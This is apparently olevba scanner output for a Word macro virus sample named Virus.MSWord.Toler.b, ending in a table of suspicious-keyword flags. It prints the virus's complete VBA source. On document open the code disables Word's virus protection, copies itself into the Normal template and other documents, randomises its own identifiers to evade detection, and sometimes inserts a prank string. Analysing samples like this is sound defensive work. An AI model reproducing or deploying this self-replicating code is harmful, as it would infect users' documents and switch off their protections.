olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type GuogxZ
  LldidxZ As Integer
  ChckkvZ As Integer
  FbcZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim CjdrZ As Object, IqahxhZ As Object
  Set CjdrZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set IqahxhZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim VckedryZ As GuogxZ, KpwgZ As GuogxZ: VckedryZ = OphxmZ(CjdrZ): KpwgZ = OphxmZ(IqahxhZ)
  If KpwgZ.ChckkvZ = 0 Then
     YgxwZ CjdrZ, IqahxhZ, VckedryZ, KpwgZ
     Options.SaveNormalPrompt = False
  End If
  If (VckedryZ.ChckkvZ = 0) Or ((KpwgZ.ChckkvZ <> 0) And (VckedryZ.ChckkvZ <> KpwgZ.ChckkvZ)) Then
     YgxwZ IqahxhZ, CjdrZ, KpwgZ, VckedryZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub YgxwZ(LldidxZ As Object, SxsZ As Object, FromP As GuogxZ, ToP As GuogxZ)
  Dim IewakhZ As String, CtbrxkZ
  IewakhZ = LldidxZ.Lines(FromP.LldidxZ, FromP.ChckkvZ)
  CtbrxkZ = Array("RhkcZ", "GuogxZ", "LldidxZ", "SxsZ", "XqlZ", "ChckkvZ", "FbcZ", "CjdrZ", "IqahxhZ", "VckedryZ", "KpwgZ", "YgxwZ", "IewakhZ", "CpwtaviZ", "UtleZ", "RcypZ", "OphxmZ", "DwgyhZ", "CtbrxkZ")
  For I = 0 To 18: DwgyhZ IewakhZ, (CtbrxkZ(I)), RhkcZ(IewakhZ): Next I
  If ToP.FbcZ Then SxsZ.DeleteLines 1, SxsZ.CountOfLines
  SxsZ.AddFromString IewakhZ
End Sub
Private Function RhkcZ(IewakhZ As String) As String
  Dim CpwtaviZ As String: CpwtaviZ = ""
  While (InStr(IewakhZ, CpwtaviZ) <> 0) Or (Len(CpwtaviZ) < 3)
     CpwtaviZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(CpwtaviZ) = 0 Then
                  CpwtaviZ = CpwtaviZ + Chr(Int(Rnd * 25 + 65))
            Else: CpwtaviZ = CpwtaviZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     CpwtaviZ = CpwtaviZ + "Z"
  Wend
  RhkcZ = CpwtaviZ
End Function
Private Sub DwgyhZ(IewakhZ As String, UtleZ As String, RcypZ As String)
  Dim I As Long
  I = 1
  While InStr(I, IewakhZ, UtleZ) <> 0
        I = InStr(I, IewakhZ, UtleZ)
        IewakhZ = Left(IewakhZ, I - 1) + RcypZ + Mid$(IewakhZ, I + Len(UtleZ))
        Index = Index + 1
  Wend
End Sub
Private Function OphxmZ(XqlZ As Object) As GuogxZ
  OphxmZ.LldidxZ = 0
  OphxmZ.ChckkvZ = 0
  OphxmZ.FbcZ = False
  For I = 1 To XqlZ.CountOfLines
   If XqlZ.Lines(I, 1) = "' Tolerance!" Then OphxmZ.LldidxZ = I
   If XqlZ.Lines(I, 1) = "End Function 'Tolerance!" Then OphxmZ.ChckkvZ = I - OphxmZ.LldidxZ + 1
   If InStr(XqlZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then OphxmZ.FbcZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

